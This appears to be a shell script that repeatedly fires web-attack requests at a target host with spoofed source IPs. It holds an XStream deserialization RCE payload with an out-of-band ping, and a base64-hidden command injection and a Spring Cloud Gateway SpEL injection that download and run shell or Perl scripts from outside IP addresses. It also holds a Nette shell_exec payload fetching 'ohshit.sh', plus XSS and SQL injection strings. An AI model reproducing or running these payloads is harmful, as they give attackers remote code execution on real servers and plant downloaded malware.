#!/bin/sh
DID=$(xxd -l 8 -c 8 -p < /dev/random);
for ((i=1; i<=$2; i++)); do
IP=$(printf "%d.%d.%d.%d\n" "$((RANDOM % 256 ))" "$((RANDOM % 256 ))" "$((RANDOM % 256 ))" "$((RANDOM % 256 ))");
curl -k --silent --output /dev/null --http1.1 --location 'http://'$1'/logon.aspx' --header 'Cookie: _imp_apg_r_='$DID'' --header 'Content-Type: text/plain' --header 'xff: '$IP'' --data 'password=7ux4398!';
curl -k --silent --output /dev/null --location 'http://'$1'/api/2.0/services/usermgmt/password/aiitzf' --header 'Cookie: _imp_apg_r_='$DID'' --header 'xff: '$IP'' --header 'Content-Type: text/plain' \
--data '
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>bash</string>
          <string>-c</string>
          <string>ping -c 3 lin.cf9dm0fs8ool8a000010gjuidsfa7s5ea.oast.site</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
';
curl -k --silent --output /dev/null  --location 'http://'$1'/api/locations' --header 'Cookie: _imp_apg_r_='$DID'' --header 'xff: '$IP'' --header 'Content-Type: text/plain' \
--data 'doAs=\\`echo Y2QgL3RtcCB8fCBjZCAvbW50IHx8ICBjZCAvcm9vdCB8fCBjZCAvOyBjdXJsIC1PIGh0dHA6Ly8xNzYuNjUuMTM3LjUvemVyby5zaDsgY2htb2QgNzc3IHplcm8uc2g7IHNoIHplcm8uc2ggJg== | base64 -d | bash\\`';
curl -k --silent --output /dev/null --location 'http://'$1'/actuator/gateway/routes/wgcmiami' --header 'xff: '$IP'' --header 'Content-Type: text/plain' --header 'Cookie: _imp_apg_r_='$DID'' \
--data '{"id": "wgcmiami", "filters": [{"name": "AddResponseHeader", "args": {"name": "Result", "value": "#{new
String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("wget -qO - http://80.68.196.6/ff|perl").getInputStream()))}"}}], "uri": "http://example.com"}';
curl -k --silent --output /dev/null --location 'http://'$1'/nette.micro/?callback=shell_exec&cmd=cd%2520%2Ftmp%3Bwget%2520http%3A%2F%2F155.94.128.95%2Fohshit.sh%3Bcurl%2520-O%2520http%3A%2F%2F155.94.128.95%2Fohshit.sh%3Bchmod%2520777%2520ohshit.sh%3Bsh%2520ohshit.sh' --header 'xff: '$IP'' --header 'Cookie: _imp_apg_r_='$DID'';
curl -k --silent --output /dev/null --location 'http://'$1'/api/rest/execute_money_transfer.php?a=<script>alertd('pawned')</script>' --header 'Content-Type: application/json' --header 'Cookie: _imp_apg_r_='$DID'' --header 'xff: '$IP'' --header 'Authorization: Basic YWRtaW46cGFzc3dvcmQ=' --data '{"amount":"14","account":"2075894","currency":"EUR","friend":"Bart"}'
curl -k --silent --output /dev/null --location 'http://'$1'/trading/rest/buy_stocks.php' --header 'Cookie: _imp_apg_r_='$DID'' --header 'xff: '$IP'' --header 'Content-Type: application/json' \
--data '{
	"trans_value": '\'' or 1=1#,
	"qty":12,
	"company":"FFIV",
	"action":"sell",
	"stock_price":165
}';
done